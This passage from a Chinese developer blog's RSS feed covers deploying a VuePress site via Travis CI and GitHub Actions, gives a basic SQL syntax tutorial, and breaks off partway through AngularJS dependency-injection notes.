<p>如果你的网站希望被搜索引擎搜索到的话, 强烈这个插件需要安装</p>
</div>
<p>生成站点地图插件, 先上插件文档 <a href="https://github.com/ekoeryanto/vuepress-plugin-sitemap" target="_blank" rel="noopener noreferrer">vuepress-plugin-sitemap</a></p>
<p>再上配置, <code>/.vuepress/config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>[</span>
      <span>"sitemap"</span><span>,</span>
      <span>{</span>
        <span>hostname</span><span>:</span> <span>""</span><span>,</span> <span>// 替换成你的 GitHub 地址</span>
        <span>exclude</span><span>:</span> <span>[</span><span>"/404.html"</span><span>]</span><span>,</span>
        <span>dateFormatter</span><span>:</span> <span>(</span><span>time</span><span>)</span> <span>=></span> <span>{</span>
          <span>return</span> time<span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="部署上线" tabindex="-1"> 部署上线</h2>
<div><p>提示</p>
<p>下面提供的是 <code>GitHub Pages</code> + <code>Travis CI</code> 的部署上线方式, 如果你有更简单的或者更好的方式请你一定私信给我<br> 部分未提及的配置或者其他部署方式, 看这里 <a href="https://vuepress.vuejs.org/zh/guide/deploy.html" target="_blank" rel="noopener noreferrer">VuePress 部署</a></p>
</div>
<h3 id="自动向-github-提交代码脚本" tabindex="-1"> 自动向 GitHub 提交代码脚本</h3>
<p>在你的项目目录中创建 <code>deploy.sh</code> , 自行修改下方中的注释行代码</p>
<div><p>注意</p>
<p>这边的分支不能提交到 master 分支上, 因为 GitHub Pages 服务中指定了 master 分支为静态页面发布分支, 所以需要在本地创建一个名为 gh-pages 的分支, 我们的博客源码全部托管在这个分支上（当然你也可以叫其他名字）</p>
</div>
<div><pre><code><span>#!/usr/bin/env sh</span>

<span># 确保脚本抛出遇到的错误</span>

<span>set</span> -e

<span>date</span><span>=</span> <span><span>`</span><span>date</span> +<span>"%Y-%m-%d %H:%M:%S"</span><span>`</span></span>
<span>commitmsg</span><span>=</span><span>'Site updated: '</span><span>$date</span>
<span>git</span> <span>add</span> -A
<span>git</span> commit -m <span>"<span>$commitmsg</span>"</span>

<span># 如果发布到 https://&lt;USERNAME>.github.io</span>

<span># 将 &lt;USERNAME> 替换成你的 GitHub 名字</span>

<span># git push -f git@github.com:&lt;USERNAME>/&lt;USERNAME>.github.io.git gh-pages:gh-pages</span>

</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="自动化脚本" tabindex="-1"> 自动化脚本</h3>
<p>在你的项目目录中创建 <code>.travis.yml</code> , 更多的配置项戳这里 <a href="https://docs.travis-ci.com/user/deployment" target="_blank" rel="noopener noreferrer">Travis CI Deployment</a></p>
<div><pre><code><span>language</span><span>:</span> node_js
<span>node_js</span><span>:</span> + lts/*

<span>install</span><span>:</span> + npm ci

<span>script</span><span>:</span> + npm run build

<span>deploy</span><span>:</span>
  <span>provider</span><span>:</span> pages
  <span>skip-cleanup</span><span>:</span> <span>true</span>
  <span>local_dir</span><span>:</span> public
  <span>github-token</span><span>:</span> $GITHUB_TOKEN <span># a token generated on github allowing travis to push code on you repository</span>
  <span>target-branch</span><span>:</span> master
  <span>verbose</span><span>:</span> <span>true</span>
  <span>keep-history</span><span>:</span> <span>true</span>
  <span>on</span><span>:</span>
    <span>branch</span><span>:</span> gh<span>-</span>pages
<span>branches</span><span>:</span>
  <span>only</span><span>:</span>
    <span>-</span> gh<span>-</span>pages
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="自动化部署" tabindex="-1"> 自动化部署</h3>
<h4 id="github-actions" tabindex="-1"> GitHub Actions</h4>
<p>在项目中创建 <code>.github</code> 文件夹, GitHub Actions 将会自动执行该目录下的所有 .yml 文件</p>
<div><pre><code><span>name</span><span>:</span> VUEPRESS DEPLOY

<span>on</span><span>:</span> <span># 触发条件</span>
  <span># 每当 push 到 master 分支时触发部署</span>
  <span>push</span><span>:</span>
    <span>branches</span><span>:</span> <span>[</span>master<span>]</span>
  <span># 手动触发部署</span>
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>docs</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest

    <span>steps</span><span>:</span>
      <span>-</span> <span>uses</span><span>:</span> actions/checkout@v2
        <span>with</span><span>:</span>
          <span># “最近更新时间” 等 git 日志相关信息, 需要拉取全部提交记录</span>
          <span>fetch-depth</span><span>:</span> <span>0</span>

      <span>-</span> <span>name</span><span>:</span> Setup Node.js
        <span>uses</span><span>:</span> actions/setup<span>-</span>node@v1
        <span>with</span><span>:</span>
          <span># 选择要使用的 node 版本</span>
          <span>node-version</span><span>:</span> <span>"14"</span>

      <span># 缓存 node_modules</span>
      <span>-</span> <span>name</span><span>:</span> Cache dependencies
        <span>uses</span><span>:</span> actions/cache@v2
        <span>id</span><span>:</span> yarn<span>-</span>cache
        <span>with</span><span>:</span>
          <span>path</span><span>:</span> <span>|</span><span>
            **/node_modules</span>
          <span>key</span><span>:</span> $<span>{</span><span>{</span> runner.os <span>}</span><span>}</span><span>-</span>yarn<span>-</span>$<span>{</span><span>{</span> hashFiles('<span>**/yarn.lock')</span> <span>}</span><span>}</span>
          <span>restore-keys</span><span>:</span> <span>|</span><span>
            ${{ runner.os }}-yarn-</span>

      <span># 如果缓存没有命中, 安装依赖</span>
      <span>-</span> <span>name</span><span>:</span> Install dependencies
        <span>if</span><span>:</span> steps.yarn<span>-</span>cache.outputs.cache<span>-</span>hit <span>!=</span> 'true'
        <span>run</span><span>:</span> yarn <span>-</span><span>-</span>frozen<span>-</span>lockfile

      <span># 运行构建脚本</span>
      <span>-</span> <span>name</span><span>:</span> Build VuePress site
        <span>run</span><span>:</span> yarn build

      <span># 查看 workflow 的文档来获取更多信息</span>
      <span># @see https://github.com/crazy-max/ghaction-github-pages</span>
      <span>-</span> <span>name</span><span>:</span> Deploy to GitHub Pages
        <span>uses</span><span>:</span> crazy<span>-</span>max/ghaction<span>-</span>github<span>-</span>pages@v2
        <span>with</span><span>:</span>
          <span># 部署到 gh-pages 分支</span>
          <span>target_branch</span><span>:</span> gh<span>-</span>pages
          <span># 部署目录为 VuePress 的默认输出目录</span>
          <span>build_dir</span><span>:</span> publish<span>-</span>pages
        <span>env</span><span>:</span>
          <span>GITHUB_TOKEN</span><span>:</span> $<span>{</span><span>{</span> secrets.GITHUB_TOKEN <span>}</span><span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="travis-ci" tabindex="-1"> Travis CI</h4>
<div><p>非常重要</p>
<p>需要想你的仓库中正确提交你的 package-lock.json, 否则 Travis CI 在执行 <code>npm ci</code> 时可能会发生错误<br> 当然如果你并不想这么做的的话, 可以将 <code>npm ci</code> 替换成 <code>npm install</code></p>
</div>
<p>首先进入 <a href="https://travis-ci.org/" target="_blank" rel="noopener noreferrer">travis-ci 官网</a>, 将对应的项目启用 Travis CI</p>
<p><img src="/assets/vuepress-blog-1.png" alt="vuepress-blog"></p>
<p>点进去之后可以进行更多的配置</p>
<p><img src="/assets/vuepress-blog-2.png" alt="vuepress-blog"></p>
<p>生成你的 GitHub Token, 首先获取这个 token, 进入 Github 设置, 左下的 Developer settings</p>
<p><img src="/assets/vuepress-blog-3.png" alt="vuepress-blog"></p>
<p>添加描述, 这里只需勾选 <code>repo</code> , 如果需要其他的配置自行勾选</p>
<p><img src="/assets/vuepress-blog-4.png" alt="vuepress-blog"></p>
<p>保存之后将会生成的 token, 将生成的 token 放入 Travis 配置中</p>
<div><p>注意</p>
<p>这边配置的变量名需要和 <code>.travis.yml</code> 中指定的名字一样, 这边使用的变量名为 GITHUB_TOKEN</p>
</div>
<p><img src="/assets/vuepress-blog-5.png" alt="vuepress-blog"></p>
<p>至此, 你可以进行发布代码操作了, 执行下面的命令即可将代码提交到你的 GitHub 上了</p>
<div><pre><code><span>npm</span> run deploy
</code></pre><div aria-hidden="true"><div></div></div></div><p>代码提交之后 Travis 也开始对你提交的代码进行编译操作了, 编译成功之后将会自动的把 <code>public</code> 目录提交到你的 master 分支了</p>
<div><p>注意</p>
<p>状态颜色一定要是绿色才代表编译并且部署成功了</p>
</div>
<p><img src="/assets/vuepress-blog-6.png" alt="vuepress-blog"></p>
<h3 id="拓展阅读" tabindex="-1"> 拓展阅读</h3>
<p>NPM 5.7.0 引入了一种新的安装依赖的方式：</p>
<div><pre><code><span>npm</span> ci
</code></pre><div aria-hidden="true"><div></div></div></div><p>它是从 <code>package-lock.json</code> 文件安装依赖, 具有快以及可靠优点, 关于速度的比较引用官方图</p>
<p><img src="/assets/vuepress-blog-7.png" alt="vuepress-blog"></p>
<p>官方有下面补充：</p>
<ul>
<li>项目里面必须存在 <code>package-lock.json</code> 或 <code>npm-shrinkwrap.json</code> .</li>
<li>如果 <code>package lock</code> 里面依赖和 <code>package.json</code> 不一致, <code>npm ci</code> 会报错并且退出, 而不是更新 <code>package lock</code> 文件</li>
<li><code>npm ci</code> 只能一次性安装整个工程的依赖, 不能使用这个命令单独添加依赖</li>
<li>如果 <code>node_modules</code> 文件夹存在, 它会在安装依赖之前删除这个文件夹</li>
<li>它不会改变 <code>package.json</code> 或者任何 <code>package-locks</code></li>
</ul>
<div><p>注意</p>
<p>如果想要使 vuepress 支持编译 node_modules 目录下的 jsx 代码时（前端框架 vue）, 可进行下列操作</p>
</div>
<p>先安装 jsx 的转换依赖 <a href="https://www.npmjs.com/package/@vue/babel-preset-jsx" target="_blank" rel="noopener noreferrer">@vue/babel-preset-jsx</a></p>
<div><pre><code><span># for yarn:</span>
<span>yarn</span> <span>add</span> -D @vue/babel-preset-jsx @vue/babel-helper-vue-jsx-merge-props
<span># for npm:</span>
<span>npm</span> <span>install</span> -D @vue/babel-preset-jsx @vue/babel-helper-vue-jsx-merge-props
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>安装 babel 的环境包</p>
<div><pre><code><span># for yarn:</span>
<span>yarn</span> <span>add</span> -D @babel/preset-env
<span># for npm:</span>
<span>npm</span> <span>install</span> -D @babel/preset-env
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>在 <code>.vuepress/config.js</code> 中添加以下代码</p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>configureWebpack</span><span>:</span> <span>{</span>
    <span>// 用于解析 node_modules 目录下的 jsx 代码</span>
    <span>module</span><span>:</span> <span>{</span>
      <span>rules</span><span>:</span> <span>[</span>
        <span>{</span>
          <span>test</span><span>:</span> <span><span>/</span><span>\.m?js$</span><span>/</span></span><span>,</span>
          <span>include</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>
          <span>use</span><span>:</span> <span>{</span>
            <span>loader</span><span>:</span> <span>"babel-loader"</span><span>,</span>
            <span>options</span><span>:</span> <span>{</span>
              <span>presets</span><span>:</span> <span>[</span>
                <span>[</span><span>"@babel/preset-env"</span><span>,</span> <span>{</span> <span>targets</span><span>:</span> <span>"defaults"</span> <span>}</span><span>]</span><span>,</span>
                <span>[</span>
                  <span>"@vue/babel-preset-jsx"</span><span>,</span>
                  <span>{</span>
                    <span>vModel</span><span>:</span> <span>true</span><span>,</span> <span>// vModel syntactic sugar</span>
                    <span>functional</span><span>:</span> <span>true</span><span>,</span> <span>// @vue/babel-sugar-functional-vue - Functional components syntactic sugar</span>
                    <span>injectH</span><span>:</span> <span>true</span><span>,</span> <span>// Automatic h injection syntactic sugar</span>
                    <span>vOn</span><span>:</span> <span>true</span><span>,</span> <span>// vOn syntactic sugar</span>
                    <span>compositionAPI</span><span>:</span> <span>false</span><span>,</span> <span>// Enables @vue/babel-sugar-composition-api-inject-h and @vue/babel-sugar-composition-api-render-instance, support returning render function in setup</span>
                  <span>}</span><span>,</span>
                <span>]</span><span>,</span>
              <span>]</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
        <span>}</span><span>,</span>
      <span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/nodejs-cli-1.png" type="image/png"/>
    </item>
    <item>
      <title>SQL 语法基础</title>
      <link>https://vxhly.github.io/views/other/sql-grammar.html</link>
      <guid>https://vxhly.github.io/views/other/sql-grammar.html</guid>
      <source url="https://vxhly.github.io/rss.xml">SQL 语法基础</source>
      <description>前言
整理了下 SQL 语法基础, 适用于 SQL server 和 MySQL, 本博文皆为实例 SQL 语句仅供参考。

</description>
      <category>other</category>
      <pubDate>Tue, 23 Jan 2018 17:04:08 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>整理了下 SQL 语法基础, 适用于 SQL server 和 MySQL, 本博文皆为实例 SQL 语句仅供参考。</p>
</div>

<h2 id="概念" tabindex="-1"> 概念</h2>
<h3 id="基本概念" tabindex="-1"> 基本概念</h3>
<ul>
<li>数据库中的行称作 <code>元组</code> 、 <code>记录</code></li>
<li>数据库中的列称作 <code>属性</code> 、 <code>字段</code></li>
<li>常见数据库模型 <code>层次模型</code> <code>网状模型</code> <code>关系模型</code> <code>对象关系模型</code> <code>对象模型</code></li>
</ul>
<h3 id="表约束" tabindex="-1"> 表约束</h3>
<ul>
<li>主键约束（Primay Key Coustraint） 唯一性, 非空性</li>
<li>唯一约束 （Unique Counstraint）唯一性, 可以空, 但只能有一个</li>
<li>检查约束 (Check Counstraint) 对该列数据的范围、格式的限制（如: 年龄、性别等）</li>
<li>默认约束 (Default Counstraint) 该数据的默认值</li>
<li>外键约束 (Foreign Key Counstraint) 需要建立两表间的关系并引用主表的列</li>
</ul>
<h3 id="curd" tabindex="-1"> CURD</h3>
<ul>
<li>创建（Create）</li>
<li>更新（Update）</li>
<li>读取（Retrieve）</li>
<li>删除（Delete）</li>
</ul>
<h2 id="数据库" tabindex="-1"> 数据库</h2>
<h3 id="创建" tabindex="-1"> 创建</h3>
<div><pre><code><span>create</span> <span>database</span> dbxx
<span>on</span> <span>(</span>
  name<span>=</span>dd1<span>,</span>filename<span>=</span><span>"c:\dd\dd1.mdf"</span><span>,</span>
  maxsize<span>=</span>unlimited<span>,</span>filegrowth<span>=</span><span>10</span><span>%</span>
<span>)</span><span>,</span>
filegroup xx <span>(</span>
  name<span>=</span>dd2<span>,</span>filename<span>=</span><span>"c:\dd\dd2,mdf"</span><span>,</span>
  maxsize<span>=</span>unlimited
<span>)</span><span>,</span>
<span>(</span>
  name<span>=</span>dd3<span>,</span>filename<span>=</span><span>"d:\dd\dd3.ndf"</span><span>,</span>
  size<span>=</span><span>50</span>MB<span>,</span>maxsize<span>=</span>unlimited<span>,</span>filegrowth<span>=</span><span>10</span>MB
<span>)</span>
log <span>on</span> <span>(</span>
  name<span>=</span>LLg<span>,</span>filename<span>=</span><span>"d:\dd\ll.;df"</span><span>,</span>
  size<span>=</span><span>10</span>MB<span>,</span>maxsize<span>=</span><span>50</span>MB<span>,</span>filegrowth<span>=</span><span>20</span>MB
<span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="删除" tabindex="-1"> 删除</h3>
<div><pre><code><span>use</span> master
<span>drop</span> <span>database</span> dbxx
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="创表" tabindex="-1"> 创表</h2>
<div><pre><code><span>create</span> <span>table</span> Student
<span>(</span>
  stuNo <span>int</span><span>,</span>
  stuName <span>varchar</span><span>(</span><span>10</span><span>)</span><span>,</span>
  sex <span>char</span><span>(</span><span>2</span><span>)</span><span>,</span>
  dep <span>varchar</span><span>(</span><span>20</span><span>)</span><span>,</span>
  ID <span>char</span><span>(</span><span>18</span><span>)</span><span>,</span>
  weight <span>decimal</span><span>(</span><span>4</span><span>,</span> <span>1</span><span>)</span>
<span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="约束" tabindex="-1"> 约束</h2>
<h3 id="主键约束" tabindex="-1"> 主键约束</h3>
<div><pre><code><span>-- 添加约束</span>
<span>alter</span> <span>table</span> Student
<span>add</span> <span>constraint</span> PK_S1 <span>primary</span> <span>key</span><span>(</span>stuNo<span>)</span>

<span>-- 删除约束</span>
<span>alter</span> <span>table</span> Student
<span>drop</span> <span>constraint</span> PK_S1
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="唯一约束" tabindex="-1"> 唯一约束</h3>
<div><pre><code><span>-- 添加约束</span>
<span>alter</span> <span>table</span> Student
<span>add</span> <span>constraint</span> UN_S2 <span>union</span><span>(</span>ID<span>)</span>

<span>-- 删除约束</span>
<span>alter</span> <span>table</span> Student
<span>drop</span> <span>constraint</span> UN_S2
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="默认约束" tabindex="-1"> 默认约束</h3>
<div><pre><code><span>-- 添加约束</span>
<span>alter</span> <span>table</span> Student
<span>add</span> <span>constraint</span> DF_S3 <span>default</span><span>(</span><span>'男'</span><span>)</span> <span>for</span> sex

<span>-- 删除约束</span>
<span>alter</span> <span>table</span> Student
<span>drop</span> <span>constraint</span> DF_S3
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="检查约束" tabindex="-1"> 检查约束</h3>
<div><pre><code><span>-- 创建约束</span>
<span>alter</span> <span>table</span> Student
<span>add</span> <span>constraint</span> CK_S4 <span>check</span><span>(</span>sex<span>=</span><span>'男'</span> <span>or</span> sex<span>=</span><span>'女'</span><span>)</span>

<span>-- 删除约束</span>
<span>alter</span> <span>table</span> Student
<span>drop</span> <span>constraint</span> CK_S4
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="外键约束" tabindex="-1"> 外键约束</h3>
<div><pre><code><span>-- 创建约束</span>
<span>alter</span> <span>table</span> Student
<span>add</span> <span>constraint</span> FK_S5 <span>foreign</span> <span>key</span><span>(</span>stuNo<span>)</span> stuInfo<span>(</span>stuID<span>)</span>

<span>-- 删除约束</span>
<span>alter</span> <span>table</span> Student
<span>drop</span> <span>constraint</span> FK_S5
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="删除-1" tabindex="-1"> 删除</h2>
<div><pre><code><span>-- 删表之前一定要先把外键约束先删掉</span>
<span>drop</span> <span>table</span> Student

<span>-- 删除表中的某一列</span>
<span>alter</span> <span>table</span> Student
<span>drop</span> <span>column</span> dep

<span>-- 删除指定数据</span>
<span>delete</span> <span>from</span> Student
<span>where</span> dep<span>=</span><span>"信息系"</span>

<span>-- 逐行删除</span>
<span>delete</span> <span>*</span> <span>from</span> Student

<span>-- 按条件删除</span>
<span>delete</span> <span>*</span> <span>from</span> Student
<span>where</span> sex<span>=</span><span>'男'</span>

<span>-- 快速删除表数据</span>
<span>truncate</span> <span>table</span> Student
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="更新" tabindex="-1"> 更新</h2>
<div><pre><code><span>-- 新增数据</span>
<span>insert</span> <span>into</span> Student
<span>values</span> <span>(</span><span>123096832</span><span>,</span><span>'张三'</span><span>,</span><span>'男'</span><span>,</span><span>'外语系'</span><span>,</span><span>350181123401021298</span><span>)</span>

<span>-- 更新数据</span>
<span>update</span> <span>table</span> Student
<span>set</span> stuName<span>=</span><span>'张三'</span> <span>where</span> stuNo<span>=</span><span>'1013141516'</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="查询" tabindex="-1"> 查询</h2>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> Student

<span>select</span> <span>all</span> sex <span>from</span> Student
<span>select</span> <span>distinct</span> sex <span>from</span>  Student <span>-- 过滤重复</span>

<span>select</span> <span>top</span> <span>3</span> <span>percent</span> <span>*</span> <span>from</span> Student <span>-- 前 3% 条</span>
<span>select</span> <span>top</span> <span>3</span> <span>*</span> <span>from</span> Student <span>-- 前 3 条</span>

<span>-- 根据某一列查询</span>
<span>select</span> <span>top</span> <span>3</span> <span>with</span> ties weight
<span>from</span> Student
<span>order</span> <span>by</span> weight <span>asc</span>

<span>-- 排序。默认升序</span>
<span>select</span> <span>*</span> <span>from</span> Student <span>order</span> <span>by</span> name
<span>select</span> <span>*</span> <span>from</span> Student <span>order</span> <span>by</span> name <span>desc</span> <span>-- 降序</span>
<span>select</span> <span>*</span> <span>from</span> Student <span>order</span> <span>by</span> name <span>asc</span> <span>-- 升序</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="统计" tabindex="-1"> 统计</h2>
<p>假设 Student 表中共有 20 行记录, 其中有效性别行数为 18</p>
<div><pre><code><span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> Student <span>-- 返回值 20,返回行为 1</span>
<span>select</span> <span>count</span><span>(</span>sex<span>)</span> <span>from</span> Student <span>-- 返回值 18,不会统计 NULL,返回行为 1</span>
<span>select</span> <span>count</span><span>(</span><span>distinct</span> sec<span>)</span> <span>from</span> Student <span>-- 返回值 2,计算不重复的,返回行为 1</span>

<span>select</span> <span>count</span><span>(</span>weight<span>)</span><span>,</span> weight
<span>from</span> Student <span>group</span> <span>by</span> weight
<span>having</span> weight <span>is</span> <span>not</span> <span>null</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Angularjs 学习笔记</title>
      <link>https://vxhly.github.io/views/other/study-angularjs-notes.html</link>
      <guid>https://vxhly.github.io/views/other/study-angularjs-notes.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Angularjs 学习笔记</source>
      <description>前言
Angularjs 1.0 的学习笔记。

</description>
      <category>other</category>
      <pubDate>Mon, 01 Apr 2019 16:44:20 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Angularjs 1.0 的学习笔记。</p>
</div>

<h2 id="依赖注入" tabindex="-1"> 依赖注入</h2>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>ng-app</span><span><span>=</span><span>"</span>MyModule<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>最基本的依赖注入方式<span><span><span>&lt;/</span>title</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>utf-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>../Script/angular.min.js<span>"</span></span> <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>base.js<span>"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>../bootstrap-3.0.0/css/bootstrap.css<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>ng-controller</span><span><span>=</span><span>"</span>MyCtrl<span>"</span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>text-align</span><span>:</span> c</span><span>"</span></span></span><span>></span></span>
        <span><span><span>&lt;</span>span</span> <span><span>style</span><span><span>=</span><span>"</span><span><span>font-size</span><span>:</span> 20px<span>;</span></span><span>"</span></span></span><span>></span></span>{{gameName}}<span><span><span>&lt;/</span>span</span><span>></span></span>
      <span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="内联式注入" tabindex="-1"> 内联式注入</h3>
<div><pre><code><span>//最基本的依赖注入方式</span>
<span>var</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>"MyModule"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>
MyModule<span>.</span><span>controller</span><span>(</span><span>"MyCtrl"</span><span>,</span> <span>[</span>
  <span>"$scope"</span><span>,</span>
  <span>function</span> <span>(</span><span>$scope</span><span>)</span> <span>{</span>
    <span>//可以修改参数,如$scope1,但下面必须同时改</span>
    $scope<span>.</span>gameName <span>=</span> <span>"hello"</span><span>;</span>
  <span>}</span><span>,</span>
<span>]</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="推断型注入" tabindex="-1"> 推断型注入</h3>
<div><pre><code><span>//推断型注入方式:函数参数的名称必须要和被注入的对象相同</span>
<span>var</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>"MyModule"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>

<span>var</span> <span>MyCtrl</span> <span>=</span> <span>function</span> <span>(</span><span>$scope</span><span>)</span> <span>{</span>
  $scope<span>.</span>gameName <span>=</span> <span>"hello"</span><span>;</span>
<span>}</span><span>;</span>

MyModule<span>.</span><span>controller</span><span>(</span><span>"MyCtrl"</span><span>,</span> MyCtrl<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="声明式注入" tabindex="-1"> 声明式注入</h3>
<div><pre><code><span>//声明式注入</span>
<span>var</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>"MyModule"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>

<span>var</span> <span>MyCtrl</span> <span>=</span> <span>function</span> <span>(</span><span>thisISMyName</span><span>)</span> <span>{</span>
  <span>//参数名称可以随意变化</span>
  thisISMyName<span>.</span>gameName <span>=</span> <span>"hello"</span><span>;</span>
<span>}</span><span>;</span>

MyCtrl<span>.</span>$inject <span>=</span> <span>[</span><span>"$scope"</span><span>]</span><span>;</span> <span>//加载模块</span>

MyModule<span>.</span><span>controller</span><span>(</span><span>"MyCtrl"</span><span>,</span> MyCtrl<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="双向绑定" tabindex="-1"> 双向绑定</h2>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1.0<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>ie=edge<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span> <span>ng-app</span><span><span>=</span><span>"</span>MyModule<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>ng-controller</span><span><span>=</span><span>"</span>MyCtrl<span>"</span></span><span>></span></span>
